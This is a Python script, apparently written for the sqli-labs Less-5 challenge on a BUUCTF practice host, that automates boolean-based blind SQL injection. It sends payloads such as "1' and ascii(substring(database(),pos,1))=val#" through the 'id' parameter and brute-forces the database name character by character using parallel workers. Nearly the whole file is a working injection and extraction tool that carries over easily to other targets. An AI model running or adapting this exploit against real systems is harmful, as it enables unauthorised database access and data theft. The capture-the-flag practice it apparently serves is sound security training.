# SQL Injection template
import requests
from concurrent.futures import ProcessPoolExecutor, as_completed
from loguru import logger as log
from sys import stderr
from time import sleep

BASE_URL = "http://2253c9ec-276a-4bc4-8b47-9d2bbaed77fc.node5.buuoj.cn:81/Less-5/"
BASE_PAYLOAD = "1' {payload}#"

log.add(stderr, colorize=True, format="<green>{time:HH:mm:ss}</green> <level>{message}</level>", level="INFO")
log.remove(0)

# Judge if try success
def judge(res: requests.Response) -> bool:
	if "You are in" in res.text:
		return True
	return False


def worker(payload: str) -> bool:
	log.debug(f"Start worker with payload: {payload}")
	params = {
		"id": payload
	}
	res = requests.get(BASE_URL, params=params)

	if res.status_code != 200:
		log.warning(f"Request failed in {payload}")
	sleep(0.5)
	return judge(res)

# TODO: can be improved to binary search
def brute_string_pos(expr: str, pos: int) -> int:
	payload = BASE_PAYLOAD.format(payload="and ascii(substring({expr},{pos},1))={val}")
	future_to_num = {executor.submit(worker, payload.format(expr=expr, pos=pos, val=i)): i for i in range(32, 128)}

	for future in as_completed(future_to_num):
		num = future_to_num[future]
		log.debug(f"check chr {chr(num)} in pos {pos}")
		res = future.result()
		if res:
			for f in reversed(list(future_to_num.keys())):
				if f.cancel() == False:
					# No need to cancel remain tasks
					break
			return num

if __name__ == "__main__":
	executor = ProcessPoolExecutor(max_workers=5)
	

	# Step 1: get db len
	db_len = 8
	# DB_LEN_MAX = 30
	# payload = BASE_PAYLOAD.format(payload="and length(database())={db_len}")
	# # debug
	# # worker(payload.format(db_len=8))
	# log.info("Start brute force database name length")
	# future_to_num = {executor.submit(worker, payload.format(db_len=i)): i for i in range(1, DB_LEN_MAX)}

	# for future in as_completed(future_to_num):
	# 	num = future_to_num[future]
	# 	res = future.result()
	# 	if res:
	# 		db_len = num
	# 		log.success(f"Database name length is {db_len}")
	# 		for f in future_to_num:
	# 			f.cancel()
	# 		break
	
	# Step 2: get db name
	db_name = ""
	db_name_list = []
	expr = "database()"
	for pos in range(1, db_len+1):
		log.info(f"Start brute force database name at position {pos}")
		res = brute_string_pos(expr, pos)
		log.success(f"db name pos {pos} is {chr(res)}")
		db_name_list.append(chr(res))
	db_name = "".join(db_name_list)
	log.success(f"DB name is {db_name}")


	# do clean
	executor.shutdown()
	